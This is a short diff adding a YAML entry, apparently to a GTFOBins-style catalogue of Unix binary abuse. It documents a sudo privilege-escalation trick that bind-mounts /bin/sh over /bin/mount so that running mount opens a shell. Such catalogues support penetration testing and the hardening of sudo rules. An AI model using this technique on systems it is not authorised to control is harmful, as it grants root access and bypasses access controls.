@@ -1,0 +1,11 @@
+---
+functions:
+  privilege-escalation:
+  - code: |-
+      mount -o bind /bin/sh /bin/mount
+      mount
+    comment: |-
+      This overrides `mount` itself with a shell (or any other executable).
+    contexts:
+      sudo:
+...
